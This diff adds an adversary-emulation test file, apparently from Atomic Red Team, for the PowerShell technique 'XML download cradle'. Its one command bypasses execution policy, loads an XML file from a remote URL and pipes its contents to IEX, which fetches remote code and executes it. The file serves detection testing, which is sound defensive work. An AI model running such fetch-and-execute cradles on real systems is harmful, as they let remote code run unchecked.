@@ -1,0 +1,8 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Powershell XML requests
+#Description: Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.&&Provided by https://github.com/mgreen27/mgreen27.github.io&
+#Language: cmd
+
+#commands
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
+
